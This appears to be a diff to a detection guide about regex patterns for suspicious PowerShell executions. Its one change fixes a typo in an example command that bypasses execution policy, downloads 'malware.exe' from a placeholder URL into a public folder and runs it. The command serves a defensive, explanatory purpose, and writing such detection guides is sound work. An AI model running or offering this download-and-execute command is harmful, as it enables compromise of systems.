@@ -67,6 +67,6 @@ Regex Pattern: Monitor PowerShell Executions with Suspicious Parameters:
 ### Example of Powershell command <THIS DOES NOTHING>:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Noprofile -Comman "invoke-Webrequest -URL 'http here' -Outfile 'C:\Users\Public\malware.exe'; Start-Process 'C\Users\Public\malware.exe'
+powershell -ExecutionPolicy Bypass -Noprofile -Command "invoke-Webrequest -URL 'http here' -Outfile 'C:\Users\Public\malware.exe'; Start-Process 'C\Users\Public\malware.exe'
 
 ```
